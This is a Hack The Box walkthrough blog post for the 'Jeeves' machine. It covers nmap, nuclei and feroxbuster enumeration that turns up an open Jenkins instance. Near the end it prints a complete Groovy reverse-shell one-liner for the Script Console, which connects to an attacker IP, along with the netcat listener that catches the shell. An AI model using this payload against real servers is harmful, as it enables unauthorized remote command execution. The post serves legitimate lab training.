# Jeeves HTB Machine Walk-Through!

“Jeeves is not exceptionally complex, but it incorporates several noteworthy techniques that offer valuable learning opportunities. Because…

---

### Jeeves HTB Machine Walk-Through!

> “Jeeves is not exceptionally complex, but it incorporates several noteworthy techniques that offer valuable learning opportunities. Because alternate data streams are rarely encountered in typical workflows, some users may struggle to identify the correct privilege‑escalation path.”

As always, we begin with an Nmap scan. I start with a basic scan to identify the open ports, and once I know what services are exposed, I follow up with a version and script scan targeting only those ports. This approach significantly improves efficiency.

```
nmap -p- 10.10.10.63
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 20:28 EDT
Nmap scan report for 10.10.10.63
Host is up (0.048s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 112.64 seconds
nmap -p 80,135,445,50000 -sV -sC -A -vv 10.10.10.63
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 20:31 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:31
Completed NSE at 20:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:31
Completed NSE at 20:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:31
Completed NSE at 20:31, 0.00s elapsed
Initiating Ping Scan at 20:31
Scanning 10.10.10.63 [4 ports]
Completed Ping Scan at 20:31, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:31
Completed Parallel DNS resolution of 1 host. at 20:31, 0.03s elapsed
Initiating SYN Stealth Scan at 20:31
Scanning 10.10.10.63 [4 ports]
Discovered open port 80/tcp on 10.10.10.63
Discovered open port 50000/tcp on 10.10.10.63
Discovered open port 135/tcp on 10.10.10.63
Discovered open port 445/tcp on 10.10.10.63
Completed SYN Stealth Scan at 20:31, 0.09s elapsed (4 total ports)
Initiating Service scan at 20:31
Scanning 4 services on 10.10.10.63
Completed Service scan at 20:31, 7.60s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.63
Retrying OS detection (try #2) against 10.10.10.63
Initiating Traceroute at 20:31
Completed Traceroute at 20:31, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 20:31
Completed Parallel DNS resolution of 2 hosts. at 20:31, 0.03s elapsed
NSE: Script scanning 10.10.10.63.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:31
NSE Timing: About 99.82% done; ETC: 20:31 (0:00:00 remaining)
Completed NSE at 20:32, 40.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
Nmap scan report for 10.10.10.63
Host is up, received echo-reply ttl 127 (0.11s latency).
Scanned at 2025-10-23 20:31:12 EDT for 53s

PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 11 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=10/23%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68FAC905%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A)
SEQ(SP=107%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M552NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.008 days (since Thu Oct 23 20:20:18 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-10-24T05:31:31
|_  start_date: 2025-10-24T05:20:30
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 54766/tcp): CLEAN (Timeout)
|   Check 3 (port 48293/udp): CLEAN (Timeout)
|   Check 4 (port 64541/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   154.58 ms 10.10.14.1
2   154.63 ms 10.10.10.63

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.76 seconds
           Raw packets sent: 92 (7.732KB) | Rcvd: 34 (2.192KB)
```

A quick Nuclei scan provides some initial insights to guide our enumeration. While it’s not exhaustive, it helps surface potential misconfigurations or vulnerabilities early, allowing us to focus our efforts more effectively. This is just something I like to do.

```
nuclei --target jeeves.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

  projectdiscovery.io

[WRN] Found 1 templates loaded with deprecated protocol syntax, update before v3 for continued support.
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.10 (latest)
[INF] Current nuclei-templates version: v10.3.0 (latest)
[INF] New templates added in latest release: 124
[INF] Templates loaded for current scan: 8615
[INF] Executing 7219 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 1396 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 1804 (Reduced 1691 Requests)
[waf-detect:modsecurity] [http] [info] http://jeeves.htb
[smb-version-detect:smb-version] [javascript] [info] jeeves.htb:445 ["SMB 2.1"]
[smb2-capabilities] [javascript] [info] jeeves.htb:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[smb2-server-time] [javascript] [info] jeeves.htb:445 ["SystemTime: 2025-10-24T08:53:55.000Z ServerStartTime: 2025-10-24T05:20:30.000Z"]
[smb-enum] [javascript] [info] jeeves.htb:445 ["NetBIOSDomainName: JEEVES","DNSComputerNamen: Jeeves","DNSComputerName: Jeeves","ForestName:","OSVersion: 10.0.10586","NetBIOSComputerName: JEEVES"]
[smb-enum-domains] [javascript] [info] jeeves.htb:445 ["DomainName: Jeeves"]
[smb-signing] [javascript] [medium] jeeves.htb:445
[smb-os-detect] [javascript] [info] jeeves.htb:445 ["Windows 10, Version 1511"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://jeeves.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://jeeves.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://jeeves.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://jeeves.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://jeeves.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://jeeves.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://jeeves.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://jeeves.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://jeeves.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://jeeves.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://jeeves.htb
[form-detection] [http] [info] http://jeeves.htb
[tech-detect:ms-iis] [http] [info] http://jeeves.htb
[options-method] [http] [info] http://jeeves.htb ["OPTIONS, TRACE, GET, HEAD, POST"]
[microsoft-iis-version] [http] [info] http://jeeves.htb ["Microsoft-IIS/10.0"]
[caa-fingerprint] [dns] [info] jeeves.htb
[INF] Scan completed in 2m. 24 matches found.
```

When accessing the website, this is the page we’re presented with. However, any query we submit redirects us back to this same error page, preventing us from interacting with the application normally.’

![](https://cdn-images-1.medium.com/max/800/1*WMuaFBHDwjcjhYNXcZMMig.png)

At this stage, our only viable avenue for further enumeration appears to be port 50000.

![](https://cdn-images-1.medium.com/max/800/1*ssVNXyD_3h3bXDsCfp3cGQ.png)

Since accessing the service results in a 404 error, this path appears to be a dead end. Our next step is to perform directory fuzzing to identify any hidden endpoints or accessible resources — there has to be an underlying attack vector somewhere.

![](https://cdn-images-1.medium.com/max/800/1*JYFS5xogl3RcgeAPZrWeFw.png)
<figcaption>404 Error page!</figcaption>

\

Our Feroxbuster enumeration provides a substantial amount of information to work with, revealing several potential points of interest for further investigation.

```
 feroxbuster -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves => http://10.10.10.63:50000/askjeeves/
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/about => http://10.10.10.63:50000/askjeeves/about/
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/search => http://10.10.10.63:50000/askjeeves/search/
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/security => http://10.10.10.63:50000/askjeeves/security/
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/projects => http://10.10.10.63:50000/askjeeves/projects/
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/people => http://10.10.10.63:50000/askjeeves/people/
500      GET       93l      598w    15434c http://10.10.10.63:50000/askjeeves/main
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/version => http://10.10.10.63:50000/askjeeves/version/
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/j_acegi_security_check => http://10.10.10.63:50000/askjeeves/loginError
200      GET       16l      507w    11405c http://10.10.10.63:50000/askjeeves/login
404      GET       16l      266w     7099c http://10.10.10.63:50000/askjeeves/signup
200      GET       14l      325w     8384c http://10.10.10.63:50000/askjeeves/newJob
200      GET       15l      509w    11692c http://10.10.10.63:50000/askjeeves/editDescription
200      GET       16l      508w    11527c http://10.10.10.63:50000/askjeeves/index
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves/assets => http://10.10.10.63:50000/askjeeves/assets/
404      GET       14l      263w     7120c http://10.10.10.63:50000/askjeeves/search/index
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       14l     1559w    46563c http://10.10.10.63:50000/askjeeves/about/index
405      GET        4l       13w      207c http://10.10.10.63:50000/askjeeves/cancelQuietDown
200      GET        1l        4w      541c http://10.10.10.63:50000/askjeeves/api/python
200      GET        1l        8w      661c http://10.10.10.63:50000/askjeeves/api/xml
200      GET        1l        4w      541c http://10.10.10.63:50000/askjeeves/api/json
405      GET        4l       13w      202c http://10.10.10.63:50000/askjeeves/createItem
405      GET        4l       13w      201c http://10.10.10.63:50000/askjeeves/quietDown
200      GET       16l      492w    11016c http://10.10.10.63:50000/askjeeves/restart
200      GET       16l      502w    11088c http://10.10.10.63:50000/askjeeves/safeRestart
200      GET      394l     1050w    18730c http://10.10.10.63:50000/askjeeves/api/schema
200      GET      102l     1116w    13998c http://10.10.10.63:50000/askjeeves/api/index
200      GET       14l      482w    10943c http://10.10.10.63:50000/askjeeves/people/index
405      GET        4l       13w      218c http://10.10.10.63:50000/askjeeves/log/newLogRecorder
200      GET      126l      678w    17885c http://10.10.10.63:50000/askjeeves/log/rss
200      GET       16l      445w     9832c http://10.10.10.63:50000/askjeeves/log/index
200      GET       19l      449w    10068c http://10.10.10.63:50000/askjeeves/log/levels
200      GET      114l      969w    23780c http://10.10.10.63:50000/askjeeves/log/all
405      GET        4l       13w      205c http://10.10.10.63:50000/askjeeves/computer/createItem
200      GET       35l      581w    12276c http://10.10.10.63:50000/askjeeves/computer/new
405      GET        4l       13w      204c http://10.10.10.63:50000/askjeeves/computer/updateNow
200      GET       22l      772w    17105c http://10.10.10.63:50000/askjeeves/computer/configure
200      GET       16l      410w     9433c http://10.10.10.63:50000/askjeeves/log/new
404      GET       14l      268w     7232c http://10.10.10.63:50000/askjeeves/api/search/index
200      GET       18l      564w    11839c http://10.10.10.63:50000/askjeeves/computer/index
200      GET        1l       17w      237c http://10.10.10.63:50000/askjeeves/log/feeds
403      GET        8l       10w      589c http://10.10.10.63:50000/askjeeves/me
404      GET       14l      269w     7281c http://10.10.10.63:50000/askjeeves/computer/search/index
404      GET       14l      269w     7254c http://10.10.10.63:50000/askjeeves/log/search/index
200      GET       16l      469w    10783c http://10.10.10.63:50000/askjeeves/computers/0/index
200      GET        1l        1w       13c http://10.10.10.63:50000/askjeeves/timeline/data
200      GET       14l      558w    12078c http://10.10.10.63:50000/askjeeves/script
200      GET      179l      455w     9033c http://10.10.10.63:50000/askjeeves/people/api/schema
200      GET        1l        1w      172c http://10.10.10.63:50000/askjeeves/people/api/json
200      GET        1l        1w      172c http://10.10.10.63:50000/askjeeves/people/api/python
200      GET        1l        2w      175c http://10.10.10.63:50000/askjeeves/people/api/xml
500      GET       98l      608w    15816c http://10.10.10.63:50000/askjeeves/widgets/01/index
200      GET       82l      916w    12382c http://10.10.10.63:50000/askjeeves/people/api/index
200      GET        2l       13w      222c http://10.10.10.63:50000/askjeeves/columns/1/column
200      GET        1l        4w       50c http://10.10.10.63:50000/askjeeves/columns/02/column
200      GET        2l       13w      222c http://10.10.10.63:50000/askjeeves/columns/01/column
200      GET        1l        2w       21c http://10.10.10.63:50000/askjeeves/columns/03/column
200      GET        1l        2w       21c http://10.10.10.63:50000/askjeeves/columns/05/column
200      GET        1l        4w       50c http://10.10.10.63:50000/askjeeves/columns/2/column
200      GET        1l        1w        9c http://10.10.10.63:50000/askjeeves/columns/06/column
200      GET        1l        2w       21c http://10.10.10.63:50000/askjeeves/columns/4/column
200      GET        1l        2w       21c http://10.10.10.63:50000/askjeeves/columns/04/column
200      GET        1l        2w       21c http://10.10.10.63:50000/askjeeves/columns/5/column
200      GET        1l        2w       21c http://10.10.10.63:50000/askjeeves/columns/3/column
400      GET       14l      253w     7001c http://10.10.10.63:50000/askjeeves/error
200      GET       14l      529w    11643c http://10.10.10.63:50000/askjeeves/computers/0/script
405      GET        4l       13w      194c http://10.10.10.63:50000/askjeeves/gc
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_10_63:50000_-1761517637.state ...
[>-------------------] - 5m    132169/13675332 6h      found:67      errors:13141
[####>---------------] - 5m     45411/220545  143/s   http://10.10.10.63:50000/
[>-------------------] - 3m      2834/220545  19/s    http://10.10.10.63:50000/askjeeves/
[>-------------------] - 3m      2707/220545  18/s    http://10.10.10.63:50000/askjeeves/about/
[>-------------------] - 3m      2749/220545  18/s    http://10.10.10.63:50000/askjeeves/search/
[>-------------------] - 3m      2658/220545  18/s    http://10.10.10.63:50000/askjeeves/security/
[>-------------------] - 2m      2169/220545  15/s    http://10.10.10.63:50000/askjeeves/api/
[>-------------------] - 2m      2442/220545  16/s    http://10.10.10.63:50000/askjeeves/projects/
[>-------------------] - 2m      2152/220545  14/s    http://10.10.10.63:50000/askjeeves/people/
[>-------------------] - 2m      2510/220545  17/s    http://10.10.10.63:50000/askjeeves/version/
[>-------------------] - 2m      2406/220545  16/s    http://10.10.10.63:50000/askjeeves/assets/
[>-------------------] - 2m      2119/220545  15/s    http://10.10.10.63:50000/askjeeves/computers/
```

This leads us to <a href="http://10.10.10.63:50000/askjeeves/" class="markup--anchor markup--p-anchor" data-href="http://10.10.10.63:50000/askjeeves/" rel="nofollow noopener" target="_blank">http://10.10.10.63:50000/askjeeves/</a>, which subsequently redirects to the management interface. From there, we can leverage the Script Console to establish a functional reverse shell.

![](https://cdn-images-1.medium.com/max/800/1*Simos0rJ91qU3tnqsMl3bw.png)

\

![](https://cdn-images-1.medium.com/max/800/1*_EJwYyYX4Y-zeKTJI_RVLQ.png)

This command off of revshells will give you a rev shell.

```
 String host="<Attacker-IP>;int port=8001;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Start a Listener nc -lvnp 8001 and we have a shell..

![](https://cdn-images-1.medium.com/max/800/1*256MKJPwUG39Cxf_kZqu_w.png)

```
nc -nvlp 8001
listening on [any] 8001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>
C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins>
```

Lets see what privilege’s we have…

![](https://cdn-images-1.medium.com/max/800/1*haQn8-Q93n5GL4mCZWvwQw.png)

\

[View original.](https://medium.com/p/3de8f2ceb44d)

Exported from [Medium](https://medium.com) on September 1, 2026.
